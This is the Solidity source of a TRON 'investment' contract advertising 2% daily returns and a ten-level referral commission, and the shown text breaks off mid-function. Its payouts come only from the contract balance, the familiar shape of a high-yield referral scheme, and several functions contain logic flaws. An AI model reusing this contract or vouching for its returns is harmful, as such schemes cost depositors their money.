//SourceUnit: tronworld.sol


/*
          

████████╗██████╗░░█████╗░███╗░░██╗░██╗░░░░░░░██╗░█████╗░██████╗░██╗░░░░░██████╗░
╚══██╔══╝██╔══██╗██╔══██╗████╗░██║░██║░░██╗░░██║██╔══██╗██╔══██╗██║░░░░░██╔══██╗
░░░██║░░░██████╔╝██║░░██║██╔██╗██║░╚██╗████╗██╔╝██║░░██║██████╔╝██║░░░░░██║░░██║
░░░██║░░░██╔══██╗██║░░██║██║╚████║░░████╔═████║░██║░░██║██╔══██╗██║░░░░░██║░░██║
░░░██║░░░██║░░██║╚█████╔╝██║░╚███║░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║███████╗██████╔╝
░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═════╝░
            
            
 
            
                               
    2% Per Day                                                  
    3.9% Referral Commission 


    10 Level Referral
    Level 1 = 1%                                                 
    Level 2 =  0.1%                                                
    Level 3 =  0.2% 
    Level 4 =  0.2% 
    Level 5 =  0.3%
    Level 6 =  0.3%
    Level 7 =  0.4%
    Level 8 =  0.4%
    Level 9 =  0.5%
    Level 10 =  0.5%
    
    
    // Website: https://tronworld.org



*/
pragma solidity ^0.4.17;

contract TronWorldXpress {

    using SafeMath for uint256;

    
    uint public totalPlayers;
    uint private setTron = 50000000000;
    uint public totalPayout;
    uint public totalRefDistributed;
    uint public totalInvested;
    uint private minDepositSize = 10000000;
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 1;
    uint public commissionDivisor = 100;
    uint private minuteRate = 236406; //DAILY 2%
    uint private releaseTime = 1594308600;
    uint private minrefrate = 5910000;
    
    uint256 highBusiness1 = 0;
    uint256 highBusiness2= 0;
    uint256 highBusiness3= 0;
    uint256 highBusiness4= 0;
    uint256 highBusiness5= 0;
    uint256 highBusiness6= 0;
    uint256 highBusiness7= 0;
    uint256 highBusiness8= 0;
    uint256 highBusiness9= 0;
    uint256 highBusiness10= 0;
        
    uint256[] public ref_minute_rate;
    address private feed1 = msg.sender;
    address private feed2 = msg.sender;
    

    address owner;
    struct Player {
        uint trxDeposit;
        uint investment_amt;
        uint time;
        uint j_time;
        uint interestProfit;

        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint td_team;
        uint td_business;
        
        uint reward_earned;
        uint cashback;
         uint256 Level_reached;
         uint interestProfit_ref;
        
    }
    
    struct Player_level_info
    {
        
        bool is_level_activated;
        uint256 Level_timestamp;
        uint256 total_business;
        uint interestProfit_cum;
        uint interestProfit_ref_cum;
        uint reward_earned_cum;
        uint cashback_cum;
        uint256 Level_timestamp_player;

    }
    
    struct Preferral{
        address player_addr;
        uint256 aff1sum;
        
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256 aff6sum;
        uint256 aff7sum;
        uint256 aff8sum;
        uint256 aff9sum;
        uint256 aff10sum;
        
       
    }
    
    struct individual_level_income
    {
        uint256 L1_income;
        uint256 L2_income;
        uint256 L3_income;
        uint256 L4_income;
        uint256 L5_income;
        uint256 L6_income;
        uint256 L7_income;
        uint256 L8_income;
        uint256 L9_income;
        uint256 L10_income;
    }
     struct Cashback{
       
        bool cb1;
        bool cb2;
        bool cb3;
        bool cb4;
        bool cb5;
        bool claimed;
        bool deposited;
    }
    
     struct Cashback_income{
       
        uint256 cb1_income;
        uint256 cb2_income;
        uint256 cb3_income;
        uint256 cb4_income;
        uint256 cb5_income;
    }
    
    struct reward{
        bool r1;
        bool r2;
        bool r3;
        bool r4;
        bool r5;
        bool r6;
        bool r1_claimed;
        bool r2_claimed;
        bool r3_claimed;
        bool r4_claimed;
        bool r5_claimed;
        bool r6_claimed;
 
    }
    
    struct reward_income{
        uint256 r1_income;
        uint256 r2_income;
        uint256 r3_income;
        uint256 r4_income;
        uint256 r5_income;
        uint256 r6_income;
    }
    
    struct high_business_income{
        uint256 r1_business;
        uint256 r2_business;
        uint256 r3_business;
        uint256 r4_business;
        uint256 r5_business;
        uint256 r6_business;
        uint256 r7_business;
        uint256 r8_business;
        uint256 r9_business;
        uint256 r10_business;

    }
    
    struct high_business_income_add{
        address r1_business_add;
        address r2_business_add;
        address r3_business_add;
        address r4_business_add;
        address r5_business_add;
        address r6_business_add;
        address r7_business_add;
        address r8_business_add;
        address r9_business_add;
        address r10_business_add;
    }
    
    
    
    mapping(address => Cashback_income) public cashback_available;
    mapping(address => reward_income) public reward_available;
    mapping(address => high_business_income) public business_high;
    mapping(address => high_business_income_add) public business_high_add;
    mapping(address => Player_level_info) public info;
    mapping(address => Cashback) public cashbacks;
    mapping(address => reward) public rewards;
    mapping(address => Preferral) public preferals;
    mapping(address => Player) public players;
    mapping(address=>individual_level_income) public individual_level_incomes;

    constructor() public {
      owner = msg.sender;
      ref_minute_rate.push(115740);             
      ref_minute_rate.push(11574);
      ref_minute_rate.push(23148);
      ref_minute_rate.push(23148);
      ref_minute_rate.push(34700);
      ref_minute_rate.push(34700);
      ref_minute_rate.push(46296);
      ref_minute_rate.push(46296);
      ref_minute_rate.push(59100);
      ref_minute_rate.push(59100);
      
    }
    


    function register(address _addr, address _affAddr) private{
        
        
      Player storage player = players[_addr];
      
     

      player.affFrom = _affAddr;
      players[_affAddr].td_team =  players[_affAddr].td_team.add(1);
      
      setRefCount(_addr,_affAddr);
       
      
      
    }
     function setRefCount(address _addr, address _affAddr) private{
         
         
        Preferral storage preferral = preferals[_addr];
        preferral.player_addr = _addr;
      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      address _affAddr5 = players[_affAddr4].affFrom;
      address _affAddr6 = players[_affAddr5].affFrom;
      address _affAddr7 = players[_affAddr6].affFrom;
      address _affAddr8 = players[_affAddr7].affFrom;
      address _affAddr9 = players[_affAddr8].affFrom;
      address _affAddr10 = players[_affAddr9].affFrom;

      preferals[_affAddr1].aff1sum = preferals[_affAddr1].aff1sum.add(1);
      
      if(_affAddr2 != address(0))
      {
          preferals[_affAddr2].aff2sum = preferals[_affAddr2].aff2sum.add(1);
       
      }
      
      
      
      if(_affAddr3 != address(0))
      {
         preferals[_affAddr3].aff3sum = preferals[_affAddr3].aff3sum.add(1);
        
      }
     
     
      if(_affAddr4 != address(0))
      {
          preferals[_affAddr4].aff4sum = preferals[_affAddr4].aff4sum.add(1);
      }
      
      if(_affAddr5 != address(0))
      {
        preferals[_affAddr5].aff5sum = preferals[_affAddr5].aff5sum.add(1);
      }
      if(_affAddr6 != address(0))
      {
        preferals[_affAddr6].aff6sum = preferals[_affAddr6].aff6sum.add(1);
      }
      if(_affAddr7 != address(0))
      {
        preferals[_affAddr7].aff7sum = preferals[_affAddr7].aff7sum.add(1);
      }
      if(_affAddr8 != address(0))
      {
        preferals[_affAddr8].aff8sum = preferals[_affAddr8].aff8sum.add(1);
      }
      if(_affAddr9 != address(0))
      {
        preferals[_affAddr9].aff9sum = preferals[_affAddr9].aff9sum.add(1);
      }
      if(_affAddr10 != address(0))
      {
        preferals[_affAddr10].aff10sum = preferals[_affAddr10].aff10sum.add(1);
      }
      
         
     }
     
    
    
    function deposit(address _affAddr) public payable {
        require(now >= releaseTime, "not launched yet!");
        collect(msg.sender);
        require(msg.value >= minDepositSize);
        
        uint depositAmount = msg.value;
        
        Player storage player = players[msg.sender];
    
        player.j_time = now;
        
        
        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            
            
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
              
            }
         
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        player.Level_reached = 0;
        
        player.investment_amt = player.investment_amt.add(depositAmount);
        
        players[_affAddr].td_business =  players[_affAddr].td_business.add(depositAmount);          
        
        //pay rewards here
        
        uint  business = players[_affAddr].td_business;
        uint livng_time = now.sub(players[_affAddr].j_time);
        if( livng_time <=  10 days )
        {
            if(business >= 100000000000 && business <  500000000000)
            {
                if(!rewards[_affAddr].r1_claimed)
                {
                  if(!rewards[_affAddr].r1)
                  {
                    player.reward_earned = player.reward_earned.add(10000000000);
                    reward_available[_affAddr].r1_income =   reward_available[_affAddr].r1_income.add(10000000000);
                    rewards[_affAddr].r1 = true;
                  }
                }
                  
            }
        }
        if(livng_time <=  30 days)
        {
            //30 day
            
                if(business >= 500000000000 && business < 1500000000000)
                {
                    if(!rewards[_affAddr].r2_claimed)
                {
                    if(!rewards[_affAddr].r2)
                  {
                     player.reward_earned = player.reward_earned.add(25000000000);
                     reward_available[_affAddr].r2_income =   reward_available[_affAddr].r2_income.add(25000000000);
                     rewards[_affAddr].r2 = true;
                  }
                }
                }
            
            
        }
         if(livng_time <=  50 days)
        {
            //50 day
            if(business >= 1500000000000 && business < 5000000000000 )
            {
                if(!rewards[_affAddr].r3_claimed)
                {
                 if(!rewards[_affAddr].r3)
                  {
                     player.reward_earned = player.reward_earned.add(75000000000);
                   reward_available[_affAddr].r3_income =   reward_available[_affAddr].r3_income.add(75000000000);
                     rewards[_affAddr].r3 = true;
                  }
                }
            }
        }
         if(livng_time <=  100 days )
        {
            //100 day
            if(business >= 5000000000000 && business < 10000000000000 )
            {
                if(!rewards[_affAddr].r4_claimed)
                {
                if(!rewards[_affAddr].r4)
                {
                     player.reward_earned = player.reward_earned.add(250000000000);
                     reward_available[_affAddr].r4_income =   reward_available[_affAddr].r4_income.add(250000000000);
                    rewards[_affAddr].r4 = true;
                }
                }
            }
            
        }
         if(livng_time <=  180 days )
        {
            //180 days
            if(business >= 10000000000000 && business < 50000000000000)
            {
                if(!rewards[_affAddr].r5_claimed)
                {
                if(!rewards[_affAddr].r5)
                {
                     player.reward_earned = player.reward_earned.add(500000000000);
                     reward_available[_affAddr].r5_income =   reward_available[_affAddr].r5_income.add(500000000000);
                    rewards[_affAddr].r5 = true;
                }
                }
            }
        }
         if(livng_time <=  360 days )
        {
            //360 days
            if(business >= 50000000000000)
            {
                if(!rewards[_affAddr].r6_claimed)
                {
                if(!rewards[_affAddr].r6)
                {
                    player.reward_earned = player.reward_earned.add(2500000000000);
                     reward_available[_affAddr].r6_income =   reward_available[_affAddr].r6_income.add(2500000000000);
                     rewards[_affAddr].r6 = true;
                }
                }
            }
        }
        
        
        //pay rewards to self
        
        if(livng_time >= 10 days && !cashbacks[msg.sender].deposited)//10 days from registration
        {
            cashbacks[msg.sender].deposited = true;
            
            if(!cashbacks[msg.sender].claimed)
            {
                if( player.trxDeposit >= 5000000000 &&  player.trxDeposit<  10000000000)
                {
                    
                     if(!cashbacks[ msg.sender].cb1)
                      {
                        info[msg.sender].cashback_cum = info[msg.sender].cashback_cum.add(250000000);
                        player.cashback = player.cashback.add(250000000);
                        cashback_available[msg.sender].cb1_income =   cashback_available[msg.sender].cb1_income.add(250000000);
                        cashbacks[ msg.sender].cb1 = true;
                        cashbacks[msg.sender].claimed = true;
                        
                      }
                   
                }
                else if(player.trxDeposit >= 10000000000  &&  player.trxDeposit <  25000000000)
                {
                     if(!cashbacks[ msg.sender].cb2)
                     {
                          info[msg.sender].cashback_cum = info[msg.sender].cashback_cum.add(750000000);
                        player.cashback = player.cashback.add(750000000);
                       cashback_available[msg.sender].cb2_income =   cashback_available[msg.sender].cb2_income.add(750000000);
                         cashbacks[ msg.sender].cb2 = true;
                          cashbacks[ msg.sender].cb1 = false;
                          cashbacks[msg.sender].claimed = true;
                     }
                    
                }
                 else if(player.trxDeposit >= 25000000000  && player.trxDeposit  <  50000000000)
                {
                    
                     if(!cashbacks[ msg.sender].cb3)
                     {
                          info[msg.sender].cashback_cum = info[msg.sender].cashback_cum.add(2500000000);
                        player.cashback = player.cashback.add(2500000000);
                        cashback_available[msg.sender].cb3_income =   cashback_available[msg.sender].cb3_income.add(2500000000);
                        cashbacks[ msg.sender].cb3 = true;
                        cashbacks[ msg.sender].cb2 = false;
                         cashbacks[ msg.sender].cb1 = false;
                         cashbacks[msg.sender].claimed = true;
                     }
                     
                    
                }
                else if(player.trxDeposit >= 50000000000  && player.trxDeposit <  100000000000)
                {
                  if(!cashbacks[ msg.sender].cb4)
                    {   
                         info[msg.sender].cashback_cum = info[msg.sender].cashback_cum.add(6250000000);
                        player.cashback = player.cashback.add(6250000000);
                       cashback_available[msg.sender].cb4_income =   cashback_available[msg.sender].cb4_income.add(6250000000);
                          cashbacks[ msg.sender].cb4 = true;
                          
                        cashbacks[ msg.sender].cb3 = false;
                        cashbacks[ msg.sender].cb2 = false;
                         cashbacks[ msg.sender].cb1 = false;
                         cashbacks[msg.sender].claimed = true;
                    }
                    
                }
                else if(player.trxDeposit >= 100000000000)
                {
                    
                     if(!cashbacks[ msg.sender].cb5)
                    {  
                         info[msg.sender].cashback_cum = info[msg.sender].cashback_cum.add(15000000000);
                        player.cashback = player.cashback.add(15000000000);
                        cashback_available[msg.sender].cb5_income =   cashback_available[msg.sender].cb5_income.add(15000000000);
                         cashbacks[ msg.sender].cb5 = true;
                         cashbacks[ msg.sender].cb4 = false;
                          
                        cashbacks[ msg.sender].cb3 = false;
                        cashbacks[ msg.sender].cb2 = false;
                         cashbacks[ msg.sender].cb1 = false;
                         cashbacks[msg.sender].claimed = true;
                    }
                    
                }
            }

            
        }
            
        
        distributeRef(depositAmount, player.affFrom);

        totalInvested = totalInvested.add(depositAmount);
        //uint feedEarn = depositAmount.mul(devCommission).mul(15).div(commissionDivisor);
       // feed1.transfer(feedEarn);
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit,false);
    }
    
    
     function withdraw_referral() public {
    
        // require(players[msg.sender].interestProfit_ref > 0,'zero referral');
        collelct_ref(msg.sender);
        transferPayout(msg.sender, players[msg.sender].interestProfit_ref,true);
    }
    


    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(address(this).balance >= depositAmount);
      require(depositAmount >= 10000000,"min reinvestis 10 trx"); //reinvest min is 10 trx
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);

      distributeRef(depositAmount, player.affFrom);

     // uint feedEarn = depositAmount.mul(devCommission).mul(15).div(commissionDivisor);
     // feed1.transfer(feedEarn);
        
        
    }
    
    function reinvest_bonus() public {
        collelct_ref(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit_ref;
      require(address(this).balance >= depositAmount);
      require(depositAmount >= 10000000,"min reinvestis 10 trx"); //reinvest min is 10 trx
      player.interestProfit_ref = 0;
    
      player.trxDeposit = player.trxDeposit.add(depositAmount);
    
    }
    
     function reinvest_cashback() public {
 
      Player storage player = players[msg.sender];
       uint256 depositAmount = player.cashback;
      player.cashback = 0;
        cashbacks[ msg.sender].cb1 = false;
        cashbacks[ msg.sender].cb2 = false;
        cashbacks[ msg.sender].cb3 = false;
        cashbacks[ msg.sender].cb4 = false;
        cashbacks[ msg.sender].cb5 = false;
      player.trxDeposit = player.trxDeposit.add(depositAmount);
      


        
    }
    function reinvest_reward() public {
 
      Player storage player = players[msg.sender];
    if(rewards[msg.sender].r1_claimed == false)
    {
      if(rewards[msg.sender].r1 == true){
          reward_available[msg.sender].r1_income =   reward_available[msg.sender].r1_income.sub(10000000000);
          player.trxDeposit = player.trxDeposit.add(10000000000);
          info[msg.sender].reward_earned_cum = info[msg.sender].reward_earned_cum.add(10000000000);
          
          rewards[msg.sender].r1_claimed = true;
      }
    }
    if(rewards[msg.sender].r2_claimed == false)
    {
      if(rewards[msg.sender].r2 == true){
          reward_available[msg.sender].r2_income =   reward_available[msg.sender].r2_income.sub(25000000000);
          player.trxDeposit = player.trxDeposit.add(25000000000);
          info[msg.sender].reward_earned_cum = info[msg.sender].reward_earned_cum.add(25000000000);
          rewards[msg.sender].r2_claimed = true;
      }
    }
    if(rewards[msg.sender].r3_claimed == false)
    {
       if(rewards[msg.sender].r3 == true){
           reward_available[msg.sender].r3_income =   reward_available[msg.sender].r3_income.sub(75000000000);
          player.trxDeposit = player.trxDeposit.add(75000000000);
          info[msg.sender].reward_earned_cum = info[msg.sender].reward_earned_cum.add(75000000000);
          rewards[msg.sender].r3_claimed = true;
      }
    }
    if(rewards[msg.sender].r4_claimed == false)
    {
       if(rewards[msg.sender].r4 == true){
           reward_available[msg.sender].r4_income =   reward_available[msg.sender].r4_income.sub(250000000000);
          player.trxDeposit = player.trxDeposit.add(250000000000);
          info[msg.sender].reward_earned_cum = info[msg.sender].reward_earned_cum.add(250000000000);
          rewards[msg.sender].r4_claimed = true;
      }
    }
    if(rewards[msg.sender].r5_claimed == false)
    {
       if(rewards[msg.sender].r5 == true){
          reward_available[msg.sender].r5_income =   reward_available[msg.sender].r5_income.sub(500000000000);
          player.trxDeposit = player.trxDeposit.add(500000000000);
          info[msg.sender].reward_earned_cum = info[msg.sender].reward_earned_cum.add(500000000000);
          rewards[msg.sender].r5_claimed = true;
      }
    }
    if(rewards[msg.sender].r6_claimed == false)
    {
       if(rewards[msg.sender].r6 == true){
           reward_available[msg.sender].r6_income =   reward_available[msg.sender].r6_income.sub(2500000000000);
          player.trxDeposit = player.trxDeposit.add(2500000000000);
          info[msg.sender].reward_earned_cum = info[msg.sender].reward_earned_cum.add(2500000000000);
          rewards[msg.sender].r6_claimed = true;
      }
    }

    }
    
 



    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
            uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }
    
    function collelct_ref(address _addr) internal{
            
        Player storage player = players[_addr];

        // uint256 current_level = player.Level_reached;
        uint secPassed = now.sub(info[_addr].Level_timestamp);
        if (secPassed > 0) {
        
            uint collectProfit = (player.affRewards.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
             player.interestProfit_ref = player.interestProfit_ref.add(collectProfit);
             info[_addr].Level_timestamp =info[_addr].Level_timestamp.add(secPassed);
        }  
           
        
    }

    function transferPayout(address _receiver, uint _amount,bool flag) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                if(flag)
                {
                     player.interestProfit_ref = player.interestProfit_ref.sub(payout);
                     player.interestProfit_ref = 0;
                }else{
                    player.interestProfit = player.interestProfit.sub(payout);
                    player.interestProfit = 0;
                }
                

                msg.sender.transfer(payout);
            }
        }
    }
    

    
    
 
    
    function updateLevelAchievment(address _addr, uint256 level) private
    {
       if( players[_addr].Level_reached < level)
       {
           players[_addr].Level_reached = level;
       }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

         

        address _affAddr2 = players[_affFrom].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;
        address _affAddr9 = players[_affAddr8].affFrom;
        address _affAddr10 = players[_affAddr9].affFrom;
        uint256 _affRewards = 0;
        
        if (_affFrom != address(0)) {
        
            individual_level_incomes[_affFrom].L1_income = individual_level_incomes[_affFrom].L1_income.add(_trx);
            info[_affFrom].total_business =  info[_affFrom].total_business.add(_trx);      
            levelHigh(msg.sender,_affFrom, players[msg.sender].trxDeposit,1);
            
        }
        if (_affAddr2 != address(0)) {
        
            info[_affAddr2].total_business =  info[_affAddr2].total_business.add(_trx); 
            individual_level_incomes[_affAddr2].L2_income = individual_level_incomes[_affAddr2].L2_income.add(_trx);
            levelHigh(msg.sender,_affAddr2, players[msg.sender].trxDeposit,2);
            
        }
        if (_affAddr3 != address(0)) {
        
            info[_affAddr3].total_business =  info[_affAddr3].total_business.add(_trx); 
             individual_level_incomes[_affAddr3].L3_income = individual_level_incomes[_affAddr3].L3_income.add(_trx);
             levelHigh(msg.sender,_affAddr3, players[msg.sender].trxDeposit,3);
        }
        if (_affAddr4 != address(0)) {
        
            info[_affAddr4].total_business =  info[_affAddr4].total_business.add(_trx); 
             individual_level_incomes[_affAddr4].L4_income = individual_level_incomes[_affAddr4].L4_income.add(_trx);
             levelHigh(msg.sender,_affAddr4, players[msg.sender].trxDeposit,4);
        }
        if (_affAddr5 != address(0)) {
        
            info[_affAddr5].total_business =  info[_affAddr5].total_business.add(_trx); 
             individual_level_incomes[_affAddr5].L5_income = individual_level_incomes[_affAddr5].L5_income.add(_trx);
              levelHigh(msg.sender,_affAddr5, players[msg.sender].trxDeposit,5);
        }
        if (_affAddr6 != address(0)) {
             info[_affAddr6].total_business =  info[_affAddr6].total_business.add(_trx); 
            individual_level_incomes[_affAddr6].L6_income = individual_level_incomes[_affAddr6].L6_income.add(_trx);
               levelHigh(msg.sender,_affAddr6, players[msg.sender].trxDeposit,6);
        }
        if (_affAddr7 != address(0)) {
             info[_affAddr7].total_business =  info[_affAddr7].total_business.add(_trx); 
             individual_level_incomes[_affAddr7].L7_income = individual_level_incomes[_affAddr7].L7_income.add(_trx);
              levelHigh(msg.sender,_affAddr7, players[msg.sender].trxDeposit,7);
        }
        if (_affAddr8 != address(0)) {
            info[_affAddr8].total_business =  info[_affAddr8].total_business.add(_trx); 
              individual_level_incomes[_affAddr8].L8_income = individual_level_incomes[_affAddr8].L8_income.add(_trx);
              levelHigh(msg.sender,_affAddr8, players[msg.sender].trxDeposit,8);
        }
        if (_affAddr9 != address(0)) {
        
             info[_affAddr9].total_business =  info[_affAddr9].total_business.add(_trx); 
             individual_level_incomes[_affAddr9].L9_income = individual_level_incomes[_affAddr9].L9_income.add(_trx);
             levelHigh(msg.sender,_affAddr9, players[msg.sender].trxDeposit,9);
        }
        if (_affAddr10 != address(0)) {
            info[_affAddr10].total_business =  info[_affAddr10].total_business.add(_trx); 
             individual_level_incomes[_affAddr10].L10_income = individual_level_incomes[_affAddr10].L10_income.add(_trx);
             levelHigh(msg.sender,_affAddr10, players[msg.sender].trxDeposit,10); 
            
        }
       

        if(!info[_affFrom].is_level_activated)
        {
            info[_affFrom].Level_timestamp = now;
            info[_affFrom].is_level_activated = true;
        }

        if (_affFrom !=address(0)) {
            
            if(players[_affFrom].trxDeposit>=players[msg.sender].trxDeposit){
                if( _trx >  players[_affFrom].trxDeposit)
                {
                    _trx = players[_affFrom].trxDeposit;
                }
                _affRewards = (_trx.mul(1)).div(100);
    
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affFrom].affRewards = players[_affFrom].affRewards.add(_affRewards);
            }
            
            
            updateLevelAchievment(_affFrom,1);
            
            

        
        }

        if (_affAddr2 != address(0)) {
            
                     
            if(players[_affAddr2].trxDeposit>=players[msg.sender].trxDeposit){
                if( _trx >  players[_affAddr2].trxDeposit)
                {
                    _trx = players[_affAddr2].trxDeposit;
                }
                _affRewards = (_trx.mul(1)).div(1000);
                
                if(players[_affAddr2].td_team >= 2)
                {
     
       
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr2].affRewards = players[_affAddr2].affRewards.add(_affRewards);

                }
            }
            updateLevelAchievment(_affAddr2,2);
            
        }

        if (_affAddr3 != address(0)) {
            
            
            if(players[_affAddr3].trxDeposit>=players[msg.sender].trxDeposit){
                if( _trx >  players[_affAddr3].trxDeposit)
                {
                    _trx = players[_affAddr3].trxDeposit;
                }
                _affRewards = (_trx.mul(2)).div(1000);
                
                if(players[_affAddr3].td_team >= 3)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr3].affRewards = players[_affAddr3].affRewards.add(_affRewards);
                    
                }
            }
            updateLevelAchievment(_affAddr3,3);  

             

        }

        if (_affAddr4 != address(0)) {
            
            if(players[_affAddr4].trxDeposit>=players[msg.sender].trxDeposit){
             
                 if( _trx >  players[_affAddr4].trxDeposit)
                {
                    _trx = players[_affAddr4].trxDeposit;
                }
                _affRewards = (_trx.mul(2)).div(1000);
                if(players[_affAddr4].td_team >= 4)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr4].affRewards = players[_affAddr4].affRewards.add(_affRewards);

                }
            }
            updateLevelAchievment(_affAddr4,4);

        }

        if (_affAddr5 != address(0)) {
             
            if(players[_affAddr5].trxDeposit>=players[msg.sender].trxDeposit){
                if( _trx >  players[_affAddr5].trxDeposit)
                {
                    _trx = players[_affAddr5].trxDeposit;
                }
                _affRewards = (_trx.mul(3)).div(1000);
                
                if(players[_affAddr5].td_team >= 5)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr5].affRewards = players[_affAddr5].affRewards.add(_affRewards);
                      
                   
    
                }
            }
            updateLevelAchievment(_affAddr5,5);

        }

        if (_affAddr6 != address(0)) {
            
            if(players[_affAddr6].trxDeposit>=players[msg.sender].trxDeposit){
                if( _trx >  players[_affAddr6].trxDeposit)
                {
                    _trx = players[_affAddr6].trxDeposit;
                }
                
                _affRewards = (_trx.mul(3)).div(1000);
                 if(players[_affAddr6].td_team >= 6)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr6].affRewards = players[_affAddr6].affRewards.add(_affRewards);
                     
                }
                
            }
            updateLevelAchievment(_affAddr6,6);

        }

        if (_affAddr7 != address(0)) {
            
            if(players[_affAddr7].trxDeposit>=players[msg.sender].trxDeposit){
            
                if( _trx >  players[_affAddr7].trxDeposit)
                {
                    _trx = players[_affAddr7].trxDeposit;
                }
                
                _affRewards = (_trx.mul(4)).div(1000);
                if(players[_affAddr7].td_team >= 7)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr7].affRewards = players[_affAddr7].affRewards.add(_affRewards);
                }  
            }
            updateLevelAchievment(_affAddr7,7);

            
        }

        if (_affAddr8 != address(0)) {
             
            if(players[_affAddr8].trxDeposit>=players[msg.sender].trxDeposit){
                if( _trx >  players[_affAddr8].trxDeposit)
                {
                    _trx = players[_affAddr8].trxDeposit;
                }
                _affRewards = (_trx.mul(4)).div(1000);
                if(players[_affAddr8].td_team >= 8)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                     players[_affAddr8].affRewards = players[_affAddr8].affRewards.add(_affRewards);
                }
            }
            updateLevelAchievment(_affAddr8,8);

        }
        if (_affAddr9 != address(0)) {
            
            if(players[_affAddr9].trxDeposit>=players[msg.sender].trxDeposit){
                if( _trx >  players[_affAddr9].trxDeposit)
                {
                    _trx = players[_affAddr9].trxDeposit;
                }
                
                _affRewards = (_trx.mul(5)).div(1000);
                 if(players[_affAddr9].td_team >= 9)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr9].affRewards = players[_affAddr9].affRewards.add(_affRewards);
    
                }
                                
            }
             updateLevelAchievment(_affAddr9,9);

        }
        if (_affAddr10 != address(0)) {
            
            
            if(players[_affAddr10].trxDeposit>=players[msg.sender].trxDeposit){
                 if( _trx >  players[_affAddr10].trxDeposit)
                {
                    _trx = players[_affAddr10].trxDeposit;
                }
                
                _affRewards = (_trx.mul(5)).div(1000);
                if(players[_affAddr10].td_team >= 10)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr10].affRewards = players[_affAddr10].affRewards.add(_affRewards);
                      
                                   
                }
    
            }
            updateLevelAchievment(_affAddr10,10);
        }

        
    }
    
    
    function levelHigh(address _fromAdd, address _affFrom, uint256 _amount, uint256 _level) private{
         
        uint256 highBusiness = 0;

        if(_level==1) {
            highBusiness = business_high[_affFrom].r1_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r1_business = business_high[_affFrom].r1_business;
            }
            else{
                business_high[_affFrom].r1_business = _amount;
                business_high_add[_affFrom].r1_business_add = _fromAdd;
            }
        }
        else if(_level==2) {
            highBusiness = business_high[_affFrom].r2_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r2_business = business_high[_affFrom].r2_business;
            }
            else{
                business_high[_affFrom].r2_business = _amount;
                business_high_add[_affFrom].r2_business_add = _fromAdd;
            }
        }
        else if(_level==3) {
            highBusiness = business_high[_affFrom].r3_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r3_business = business_high[_affFrom].r3_business;
            }
            else{
                business_high[_affFrom].r3_business = _amount;
                business_high_add[_affFrom].r3_business_add = _fromAdd;
            }
        }
        else if(_level==4) {
            highBusiness = business_high[_affFrom].r4_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r4_business = business_high[_affFrom].r4_business;
            }
            else{
                business_high[_affFrom].r4_business = _amount;
                business_high_add[_affFrom].r4_business_add = _fromAdd;
            }
        }
        else if(_level==5) {
            highBusiness = business_high[_affFrom].r5_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r5_business = business_high[_affFrom].r5_business;
            }
            else{
                business_high[_affFrom].r5_business = _amount;
                business_high_add[_affFrom].r5_business_add = _fromAdd;
            }
        }
        else if(_level==6) {
            highBusiness = business_high[_affFrom].r6_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r6_business = business_high[_affFrom].r6_business;
            }
            else{
                business_high[_affFrom].r6_business = _amount;
                business_high_add[_affFrom].r6_business_add = _fromAdd;
            }
        }
        else if(_level==7) {
            highBusiness = business_high[_affFrom].r7_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r7_business = business_high[_affFrom].r7_business;
            }
            else{
